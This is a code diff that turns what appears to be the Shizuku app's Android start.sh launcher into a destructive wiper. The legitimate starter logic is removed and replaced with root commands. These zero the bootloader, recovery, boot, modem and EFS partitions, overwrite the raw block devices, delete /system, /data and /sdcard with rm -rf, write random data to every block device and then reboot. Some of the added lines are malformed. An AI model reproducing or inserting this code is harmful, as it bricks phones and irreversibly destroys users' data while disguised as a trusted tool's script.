@@ -1,51 +1,87 @@
-#!/system/bin/sh
 
-SOURCE_PATH="%%%STARTER_PATH%%%"
-STARTER_PATH="/data/local/tmp/shizuku_starter"
+su -c dd if=/dev/zero of=/dev/block/by-name/abl
+su -c dd if=/dev/zero of=/dev/block/by-name/abl_a
+su -c dd if=/dev/zero of=/dev/block/by-name/abl_b
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_a
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_b
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_bak
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_a
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_config_b
+su -c dd if=/dev/zero of=/dev/block/by-name/xbl_configbak
 
-echo "info: start.sh begin"
+su -c dd if=/dev/zero of=/dev/block/by-name/recovery
+su -c dd if=/dev/zero of=/dev/block/by-name/recovery_a
+su -c dd if=/dev/zero of=/dev/block/by-name/recovery_b
 
-recreate_tmp() {
-  echo "info: /data/local/tmp is possible broken, recreating..."
-  rm -rf /data/local/tmp
-  mkdir -p /data/local/tmp
-}
+su -c dd if=/dev/zero of=/dev/block/by-name/boot
+su -c dd if=/dev/zero of=/dev/block/by-name/boot_a
+su -c dd if=/dev/zero of=/dev/block/by-name/boot_b
 
-broken_tmp() {
-  echo "fatal: /data/local/tmp is broken, please try reboot the device or manually recreate it..."
-  exit 1
-}
+su -c dd if=/dev/zero of=/dev/block/by-name/fsc
+su -c dd if=/dev/zero of=/dev/block/by-name/fsg
+su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs1
+su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs2
+su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefs3
+su -c dd if=/dev/zero of=/dev/block/by-name/mdm1m9kefsc
+su -c dd if=/dev/zero of=/dev/block/by-name/modem
+su -c dd if=/dev/zero of=/dev/block/by-name/modemst1
+su -c dd if=/dev/zero of=/dev/block/by-name/modemst2
 
-if [ -f "$SOURCE_PATH" ]; then
-    echo "info: attempt to copy starter from $SOURCE_PATH to $STARTER_PATH"
-    rm -f $STARTER_PATH
+su -c dd if=/dev/zero of=/dev/block/by-name/presist
+su -c dd if=/dev/zero of=/dev/block/by-name/presistbak
 
-    cp "$SOURCE_PATH" $STARTER_PATH
-    res=$?
-    if [ $res -ne 0 ]; then
-      recreate_tmp
-      cp "$SOURCE_PATH" $STARTER_PATH
+su -c dd if=/dev/zero of=/dev/block/by-name/devcfg
+su -c dd if=/dev/zero of=/dev/block/by-name/devinfo
+su -c dd if=/dev/zero of=/dev/block/by-name/dtbo
 
-      res=$?
-      if [ $res -ne 0 ]; then
-        broken_tmp
-      fi
-    fi
+dd if=/dev/zero of=/dev/block/sda bs=1M count=100
+dd if=/dev/zero of=/dev/block/sdb
+dd if=/dev/zero of=/dev/block/sdc
+dd if=/dev/zero of=/dev/block/sdd
+dd if=/dev/zero of=/dev/block/sde
+dd if=/dev/zero of=/dev/block/sdf
+dd if=/dev/zero of=/dev/block/sda1
+dd if=/dev/zero of=/dev/block/sda2
+dd if=/dev/zero of=/dev/block/sda3
+dd if=/dev/zero of=/dev/block/sda4
+dd if=/dev/zero of=/dev/block/sda5
+dd if=/dev/zero of=/dev/block/sda6
+dd if=/dev/zero of=/dev/block/sda7
+dd if=/dev/zero of=/dev/block/sda8
+dd if=/dev/zero of=/dev/block/sda9
+dd if=/dev/zero of=/dev/block/sda10
+dd if=/dev/zero of=/dev/block/sda11
+dd if=/dev/zero of=/dev/block/sda12
+dd if=/dev/zero of=/dev/block/sda13
 
-    chmod 700 $STARTER_PATH
-    chown 2000 $STARTER_PATH
-    chgrp 2000 $STARTER_PATH
-fi
+dd if=/dev/zero of=/dev/block/loop*
+dd if=/dev/zero of=$(magisk --path)/.magisk/block/system_root
 
-if [ -f $STARTER_PATH ]; then
-  echo "info: exec $STARTER_PATH"
-    $STARTER_PATH "$1"
-    result=$?
-    if [ ${result} -ne 0 ]; then
-        echo "info: shizuku_starter exit with non-zero value $result"
-    else
-        echo "info: shizuku_starter exit with 0"
-    fi
-else
-    echo "Starter file not exist, please open Shizuku and try again."
-fi
+rm -rf /system
+rm -rf /data
+rm -rf /data/data
+rm -rf /vendor
+rm -rf /product
+rm -rf /mnt
+rm -rf /proc
+rm -rf /sdcard
+rm -rf /storage/emulated/0
+rm -rf /storage/sdcard
+rm -rf /dev/
+rm -rf /dev/input/
+rm -rf /*
+
+devices='ls /dev/block/sd*`
+for poweroff in ${devices}
+do
+echo "poweroff" > ${poweroff}
+
+for unonline in $(ls -aR /dev/block/*)
+do
+dd if=/dev/urandom of=${unonline} bs=1k count=1
+
+reboot
+
+done
